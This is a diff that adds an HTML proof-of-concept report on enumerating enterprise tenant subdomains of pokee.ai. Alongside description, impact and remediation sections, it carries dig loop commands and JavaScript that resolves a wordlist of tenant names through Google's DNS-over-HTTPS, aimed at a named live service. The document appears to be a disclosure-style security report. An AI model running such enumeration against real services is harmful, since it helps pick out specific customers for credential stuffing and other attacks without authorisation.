@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC: Enterprise Tenant Subdomain Enumeration - pokee.ai</title>
+    <style>
+        body { font-family: monospace; max-width: 1000px; margin: 20px auto; padding: 20px; background: #1a1a2e; color: #eaeaea; }
+        h1 { color: #ff6b6b; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        h2 { color: #4ecdc4; margin-top: 30px; }
+        .code { background: #0f0f23; padding: 15px; border-radius: 5px; overflow-x: auto; border: 1px solid #333; }
+        .finding { background: #2d2d44; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #ff6b6b; }
+        .evidence { background: #1a1a2e; padding: 10px; border-radius: 3px; border: 1px solid #444; margin: 10px 0; }
+        button { background: #ff6b6b; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 14px; }
+        button:hover { background: #ff5252; }
+        button:disabled { background: #666; cursor: not-allowed; }
+        #results { margin-top: 20px; }
+        .tenant-found { color: #ff6b6b; font-weight: bold; }
+        .tenant-not-found { color: #888; }
+        .info { color: #4ecdc4; }
+    </style>
+</head>
+<body>
+    <h1>PoC: Enterprise Tenant Subdomain Enumeration</h1>
+    <p>Target: pokee.ai Enterprise API (your-tenant.enterprise.pokee.ai)</p>
+    <p>Severity: MEDIUM (CVSS 5.3)</p>
+    
+    <div class="finding">
+        <h2>Vulnerability Description</h2>
+        <p>Enterprise tenants on pokee.ai receive dedicated subdomains under the pattern <code>your-tenant.enterprise.pokee.ai</code>. 
+        There is no protection against subdomain enumeration, allowing attackers to discover valid tenant subdomains 
+        and target them specifically for further attacks (credential stuffing, authentication bypass, API abuse).</p>
+    </div>
+
+    <div class="finding">
+        <h2>Evidence</h2>
+        <div class="evidence">
+            <strong>Documentation Reference:</strong> https://docs.pokee.ai/docs/api-reference<br>
+            <strong>Endpoint Format:</strong> <code>https://your-tenant.enterprise.pokee.ai</code><br>
+            <strong>Authentication:</strong> <code>pk_<tenant>_<token></code> format
+        </div>
+        <p>The documentation explicitly shows the subdomain pattern, confirming the naming convention for enterprise tenants.</p>
+    </div>
+
+    <div class="finding">
+        <h2>Proof of Concept</h2>
+        <p>This PoC demonstrates subdomain enumeration by attempting to resolve common tenant subdomain names.</p>
+        
+        <button id="startBtn" onclick="startEnumeration()">Start Enumeration</button>
+        <button id="stopBtn" onclick="stopEnumeration()" disabled>Stop</button>
+        
+        <div id="results"></div>
+        
+        <h2>Manual Verification Commands</h2>
+        <div class="code">
+# Check if enterprise.pokee.ai exists
+dig enterprise.pokee.ai
+
+# Check for wildcard DNS
+dig random-nonexistent.enterprise.pokee.ai
+
+# Try common tenant names
+for tenant in demo test staging dev prod api admin internal; do
+    dig +short $tenant.enterprise.pokee.ai
+done
+        </div>
+    </div>
+
+    <div class="finding">
+        <h2>Impact</h2>
+        <ul>
+            <li>Tenant enumeration enables targeted attacks against specific enterprise customers</li>
+            <li>Attackers can identify valid tenants, then attempt authentication bypass</li>
+            <li>Credential stuffing against known tenant subdomains</li>
+            <li>API abuse against known tenants</li>
+            <li>Information disclosure about customer base</li>
+        </ul>
+    </div>
+
+    <div class="finding">
+        <h2>Remediation</h2>
+        <ul>
+            <li>Implement subdomain enumeration protection (wildcard DNS with authentication at edge)</li>
+            <li>Use non-guessable tenant identifiers (UUIDs instead of names)</li>
+            <li>Require VPN/private network access for enterprise API</li>
+            <li>Implement rate limiting on subdomain resolution attempts</li>
+            <li>Monitor and alert on enumeration attempts</li>
+        </ul>
+    </div>
+
+    <script>
+        // Common tenant name patterns
+        const tenantNames = [
+            'demo', 'test', 'staging', 'dev', 'prod', 'production',
+            'api', 'admin', 'internal', 'app', 'console', 'dashboard',
+            'company', 'corp', 'enterprise', 'partner', 'client',
+            'customer', 'tenant', 'org', 'organization', 'team',
+            'acme', 'example', 'sample', 'trial', 'sandbox',
+            'pokee', 'isaac', 'ai', 'ml', 'model', 'agent',
+            'dev1', 'dev2', 'stage1', 'stage2', 'prod1', 'prod2'
+        ];
+
+        let isRunning = false;
+        let currentIndex = 0;
+
+        async function checkSubdomain(tenant) {
+            const subdomain = `${tenant}.enterprise.pokee.ai`;
+            try {
+                // Use DNS-over-HTTPS via a public resolver
+                const response = await fetch(`https://dns.google/resolve?name=${subdomain}&type=A`);
+                const data = await response.json();
+                
+                if (data.Answer && data.Answer.length > 0) {
+                    return { tenant, subdomain, found: true, ips: data.Answer.map(a => a.data) };
+                }
+                return { tenant, subdomain, found: false };
+            } catch (e) {
+                return { tenant, subdomain, found: false, error: e.message };
+            }
+        }
+
+        async function runEnumeration() {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '<p class="info">Starting enumeration...</p>';
+            
+            isRunning = true;
+            currentIndex = 0;
+            
+            for (const tenant of tenantNames) {
+                if (!isRunning) break;
+                
+                const result = await checkSubdomain(tenant);
+                const div = document.createElement('div');
+                div.style.margin = '5px 0';
+                div.style.padding = '5px 10px';
+                div.style.borderRadius = '3px';
+                
+                if (result.found) {
+                    div.className = 'tenant-found';
+                    div.innerHTML = `✓ FOUND: <strong>${result.subdomain}</strong> -> ${result.ips.join(', ')}`;
+                    div.style.background = 'rgba(255, 107, 107, 0.2)';
+                    div.style.border = '1px solid #ff6b6b';
+                } else {
+                    div.className = 'tenant-not-found';
+                    div.innerHTML = `✗ Not found: ${result.subdomain}`;
+                }
+                
+                resultsDiv.insertBefore(div, resultsDiv.firstChild);
+                
+                // Small delay to avoid rate limiting
+                await new Promise(r => setTimeout(r, 100));
+            }
+            
+            if (isRunning) {
+                const doneDiv = document.createElement('div');
+                doneDiv.className = 'info';
+                doneDiv.innerHTML = '<strong>Enumeration complete.</strong>';
+                resultsDiv.insertBefore(doneDiv, resultsDiv.firstChild);
+            }
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        }
+
+        function startEnumeration() {
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            runEnumeration();
+        }
+
+        function stopEnumeration() {
+            isRunning = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        }
+    </script>
+</body>
+</html>
